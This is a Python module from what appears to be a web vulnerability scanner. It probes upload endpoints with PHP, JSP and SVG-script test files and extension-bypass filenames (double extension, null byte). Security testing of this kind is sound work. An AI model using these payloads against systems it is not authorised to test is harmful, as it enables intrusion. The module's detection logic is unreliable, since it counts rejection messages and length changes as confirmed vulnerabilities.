"""File Upload Module for TanPha V5.1 (Multi-Extension + Error-Based)."""
import time
import html
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse

class UploadModule(BaseModule):
    name = "FileUpload"
    module_id = "upload"
    version = "5.1 (Multi-Extension)"
    vulnerability_class = "FILE_UPLOAD"
    default_impact = "REMOTE_CODE_EXECUTION"
    default_privilege = "WEB_USER"

    # Tebakan nama field upload
    FILE_FIELD_NAMES = ["file", "upload", "image", "attachment", "fileToUpload", "photo", "avatar"]

    # Payload file berbahaya (PHP, JSP, SVG, dll)
    UPLOAD_PAYLOADS = [
        {"filename": "shell.php", "content_type": "application/x-php", "content": b"<?php echo 'TANPHA_PWNED'; ?>"},
        {"filename": "shell.phtml", "content_type": "application/x-php", "content": b"<?php echo 'TANPHA_PWNED'; ?>"},
        {"filename": "shell.php5", "content_type": "application/x-php", "content": b"<?php echo 'TANPHA_PWNED'; ?>"},
        {"filename": "shell.jsp", "content_type": "application/x-java", "content": b"<% out.println(\"TANPHA_PWNED\"); %>"},
        {"filename": "shell.svg", "content_type": "image/svg+xml", "content": b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"},
        {"filename": "shell.php.jpg", "content_type": "image/jpeg", "content": b"<?php echo 'TANPHA_PWNED'; ?>"},
        {"filename": "shell.php%00.jpg", "content_type": "image/jpeg", "content": b"<?php echo 'TANPHA_PWNED'; ?>"}
    ]

    # Penanda kalau server kena error upload (BUKTI RENTAN)
    UPLOAD_ERROR_MARKERS = [
        "move_uploaded_file",
        "failed to open stream",
        "invalid file",
        "file type not allowed",
        "extension not allowed",
        "unexpected error"
    ]

    def __init__(self):
        super().__init__()

    def can_run(self, context: TargetContext) -> bool:
        return True

    @staticmethod
    def _servlet_url(url: str) -> str:
        p = urlparse(url)
        path = p.path
        if path.endswith(".html"):
            path = path[:-5]
        return f"{p.scheme}://{p.netloc}{path}"

    def _send_file(self, context, field_name, filename, content_type, content, auth_checker=None):
        target = self._servlet_url(context.target.base_url)
        files = {field_name: (filename, content, content_type)}
        
        # Trik POST multipart
        return context.http_client.request(
            "POST", target, files=files,
            auth_checker=auth_checker, bypass_mutation=True, timeout=15
        )

    def _is_upload_anomaly(self, response) -> tuple[bool, str]:
        if not response: return False, ""
        
        res_text = html.unescape(response.text).lower() if response.text else ""
        res_status = getattr(response, "status_code", 200)
        
        # 1. Cek Error-Based (Server crash / salah konfigurasi)
        if any(marker in res_text for marker in self.UPLOAD_ERROR_MARKERS):
            return True, "ERROR_BASED"
            
        # 2. Cek sukses (atau HTTP 500)
        if res_status == 500:
            return True, "HTTP_500"
            
        if "uploaded" in res_text or "success" in res_text:
            return True, "SUCCESS_MESSAGE"
            
        return False, ""

    def assess(self, context: TargetContext, auth_checker=None) -> list[Evidence]:
        evidence_pool = []
        print(f"      [>] Testing File Upload (Multi-Extension) on: {self._servlet_url(context.target.base_url)}")

        # 1. Ambil Baseline (Kirim file normal)
        baseline_res = self._send_file(context, "file", "test.txt", "text/plain", b"hello world", auth_checker)
        
        if not baseline_res or not baseline_res.response:
            print("      [-] Baseline upload failed (endpoint might not accept files).")
            return []

        baseline_text = baseline_res.response.text or ""
        baseline_len = len(baseline_text)

        # 2. Loop nama field & payload
        for field in self.FILE_FIELD_NAMES:
            print(f"      [>] Trying field name: '{field}'...")
            for payload in self.UPLOAD_PAYLOADS:
                res = self._send_file(context, field, payload["filename"], payload["content_type"], payload["content"], auth_checker)
                
                if res and res.response:
                    is_suspicious, reason = self._is_upload_anomaly(res.response)
                    res_len = len(res.response.text or "")
                    
                    # Kalau beda panjang response drastis (kemungkinan file dieksekusi/diterima)
                    if not is_suspicious and abs(res_len - baseline_len) > 100:
                        is_suspicious = True
                        reason = "LENGTH_CHANGED"

                    if is_suspicious:
                        print(f"      [!!] Upload CONFIRMED via field '{field}' ({payload['filename']}) - {reason}!")
                        return [Evidence(
                            attempt_id="upload_confirmed", module_id=self.module_id, module_version=self.version,
                            location=context.target.base_url, parameter=field, outcome="FILE_UPLOADED",
                            reason_code="UPLOAD_CONFIRMED", reason_detail=f"Behavior: {reason}",
                            confidence=0.9, evidence_text=f"Uploaded {payload['filename']}", assess_payload=payload['filename']
                        )]

        return []

    def verify(self, context: TargetContext, evidence: Evidence, auth_checker=None) -> VerificationResult:
        if evidence.reason_code == "UPLOAD_CONFIRMED":
            # Re-probe: Coba upload file yang sama lagi
            res = self._send_file(context, evidence.parameter, evidence.assess_payload, "application/x-php", b"<?php echo 'TANPHA_VERIFY'; ?>", auth_checker)
            if res and res.response:
                is_suspicious, reason = self._is_upload_anomaly(res.response)
                if is_suspicious:
                    return VerificationResult(
                        VerificationStatus.VALIDATED, 0.95, "UPLOAD_RECONFIRMED",
                        "Re-verified upload success/error.", verify_payload=evidence.assess_payload
                    )
        
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "FAILED", "Not vuln")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] FILE UPLOAD EXPLOITATION [***]")
        print(f"[*] Target: {finding.location}")
        print(f"[*] Field: '{finding.parameter}'")
        print(f"[*] Uploaded File: {finding.verify_payload}")
